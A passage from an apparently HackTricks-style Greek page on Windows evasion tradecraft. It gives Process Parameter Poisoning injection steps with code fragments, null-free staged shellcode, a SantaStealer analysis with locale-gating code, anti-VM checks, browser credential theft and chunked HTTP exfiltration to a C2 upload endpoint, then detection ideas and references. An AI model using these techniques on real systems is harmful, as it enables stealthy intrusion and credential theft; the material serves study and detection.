Minimal flow:
```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```
### Εκτέλεση του copied parameter buffer

Η copied parameter region είναι συνήθως `RW`, όχι executable. Ένα συνηθισμένο P3 chain είναι:

1. Δημιουργήστε κανονικά το process (όχι suspended)
2. Κάντε τη σελίδα παραμέτρων που επιλέξατε executable με `NtProtectVirtualMemory` / `VirtualProtectEx`
3. Επαναχρησιμοποιήστε το main thread handle που έχει ήδη επιστραφεί στο `PROCESS_INFORMATION`
4. Ανακατευθύνετε την εκτέλεση με `NtSetContextThread` (`CONTEXT_CONTROL`, overwrite του `RIP`)

Σε αντίθεση με τα classic thread hijacking workflows, αυτό **δεν απαιτεί** `SuspendThread` / `ResumeThread`· το context μπορεί να αλλάξει απευθείας στο returned main thread handle.

Αυτό αποφεύγει αρκετά APIs που παρακολουθούνται συνήθως για injection:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- συχνά επίσης `SuspendThread` / `ResumeThread`

### Περιορισμός null-byte και staged shellcode

Και οι τρεις carriers είναι **string ή string-like data**, επομένως ένα raw payload που περιέχει `0x00` αποκόπτεται κατά τη μεταφορά. Μια πρακτική λύση είναι ένα **null-free first stage** που ανακατασκευάζει constants κατά το runtime και στη συνέχεια φορτώνει ένα αυθαίρετο second stage.

Ένα απλό pattern είναι η XOR-based constant synthesis:
```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```
Αυτό επιτρέπει στο πρώτο stage να δημιουργεί stack strings, ορίσματα API, διαδρομές DLL ή έναν second-stage shellcode loader χωρίς να ενσωματώνει null bytes στην transported παράμετρο.

### Stack-based API calls από το πρώτο stage

Όταν το πρώτο stage πρέπει να καλέσει APIs όπως το `LoadLibraryA`, μπορεί να:

- κάνει push το string/buffer στο target stack
- δεσμεύσει το **32-byte x64 shadow space**
- ορίσει τα `RCX`, `RDX`, `R8`, `R9` σε constants ή pointers σχετικούς με το `RSP`
- διατηρεί το `RSP` **16-byte aligned** πριν από το call

Στη συνέχεια, ένα second stage μπορεί να αντιγραφεί από το stack σε μια `PAGE_READWRITE` allocation, να μετατραπεί σε `PAGE_EXECUTE_READ` με `VirtualProtect` και να γίνει jump σε αυτό, αποφεύγοντας μια άμεση RWX allocation.

### Ιδέες για Detection

Καλές ευκαιρίες για hunting που αναφέρονται από τους συγγραφείς:

- `VirtualProtectEx` / `NtProtectVirtualMemory` που καθιστούν **process-parameter pages executable**
- η συγκεκριμένη αλλαγή protection ακολουθούμενη από `SetThreadContext` / `NtSetContextThread`
- remote reads των `PEB` και στη συνέχεια του `RTL_USER_PROCESS_PARAMETERS`
- ασυνήθιστα μεγάλες / υψηλού entropy τιμές στα `lpCommandLine`, `lpEnvironment` ή `STARTUPINFO.lpReserved` κατά τη δημιουργία process

### Σημειώσεις

- Το P3 είναι ένα **cross-process transfer trick**, όχι από μόνο του ένα πλήρες execution primitive: η αντιγραμμένη παράμετρος εξακολουθεί να χρειάζεται αλλαγή σε execute-permission και μια μέθοδο execution redirection.
- Οι `RtlCreateProcessReflection` / Dirty Vanity εξετάστηκαν από τους συγγραφείς, αλλά απορρίφθηκαν επειδή εσωτερικά καταλήγουν σε ύποπτα primitives όπως τα `NtWriteVirtualMemory` και `NtCreateThreadEx`.

## SantaStealer Tradecraft για Fileless Evasion και Credential Theft

Το SantaStealer (γνωστό και ως BluelineStealer) δείχνει πώς τα σύγχρονα info-stealers συνδυάζουν AV bypass, anti-analysis και credential access σε ένα ενιαίο workflow.

### Keyboard layout gating & sandbox delay

- Ένα config flag (`anti_cis`) απαριθμεί τα εγκατεστημένα keyboard layouts μέσω του `GetKeyboardLayoutList`. Αν εντοπιστεί Cyrillic layout, το sample δημιουργεί ένα κενό `CIS` marker και τερματίζεται πριν εκτελέσει stealers, διασφαλίζοντας ότι δεν θα detonates ποτέ σε excluded locales, ενώ αφήνει ένα hunting artifact.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Layered λογική `check_antivm`

- Η Variant A διατρέχει τη λίστα διεργασιών, υπολογίζει το hash κάθε ονόματος με ένα custom rolling checksum και το συγκρίνει με ενσωματωμένες blocklists για debuggers/sandboxes· επαναλαμβάνει το checksum για το όνομα του υπολογιστή και ελέγχει working directories όπως `C:\analysis`.
- Η Variant B επιθεωρεί system properties (κατώτατο όριο πλήθους διεργασιών, πρόσφατο uptime), καλεί το `OpenServiceA("VBoxGuest")` για να ανιχνεύσει VirtualBox additions και εκτελεί timing checks γύρω από sleeps για τον εντοπισμό single-stepping. Οποιοδήποτε hit διακόπτει την εκτέλεση πριν από την εκκίνηση των modules.

### Fileless helper + double ChaCha20 reflective loading

- Το κύριο DLL/EXE ενσωματώνει έναν Chromium credential helper, ο οποίος είτε αποθηκεύεται στον δίσκο είτε γίνεται manually mapped στη μνήμη· στη fileless λειτουργία επιλύει μόνος του τα imports/relocations, ώστε να μην εγγράφονται helper artifacts.
- Ο helper αποθηκεύει ένα second-stage DLL κρυπτογραφημένο δύο φορές με ChaCha20 (δύο keys των 32 byte + nonces των 12 byte). Μετά και τα δύο passes, φορτώνει reflectively το blob (χωρίς `LoadLibrary`) και καλεί τα exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup`, τα οποία προέρχονται από το [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).
- Οι ρουτίνες του ChromElevator χρησιμοποιούν direct-syscall reflective process hollowing για injection σε ένα ενεργό Chromium browser, κληρονομούν τα AppBound Encryption keys και κάνουν decrypt passwords/cookies/credit cards απευθείας από SQLite databases, παρά το ABE hardening.


### Modular συλλογή στη μνήμη & chunked HTTP exfil

- Η `create_memory_based_log` διατρέχει έναν global πίνακα function pointers `memory_generators` και δημιουργεί ένα thread ανά ενεργοποιημένο module (Telegram, Discord, Steam, screenshots, documents, browser extensions κ.λπ.). Κάθε thread γράφει τα αποτελέσματα σε shared buffers και αναφέρει το file count μετά από ένα παράθυρο join περίπου 45 δευτερολέπτων.
- Όταν ολοκληρωθεί η διαδικασία, όλα συμπιέζονται με τη statically linked βιβλιοθήκη `miniz` ως `%TEMP%\\Log.zip`. Στη συνέχεια, το `ThreadPayload1` κάνει sleep για 15 δευτερόλεπτα και μεταδίδει το archive σε chunks των 10 MB μέσω HTTP POST στο `http://<C2>:6767/upload`, πλαστογραφώντας ένα browser `multipart/form-data` boundary (`----WebKitFormBoundary***`). Κάθε chunk προσθέτει `User-Agent: upload`, `auth: <build_id>`, προαιρετικά `w: <campaign_tag>`, ενώ το τελευταίο chunk προσθέτει `complete: true`, ώστε το C2 να γνωρίζει ότι ολοκληρώθηκε η επανασυναρμολόγηση.

## References

- [Advanced Evasion Tradecraft: Precision Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)
- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [Sleeping Beauty: Putting Adaptix to Bed with Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [SensePost – Process Parameter Poisoning](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [Sleeping Beauty II: CFG, CET, and Stack Spoofing](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)

{{#include ../banners/hacktricks-training.md}}
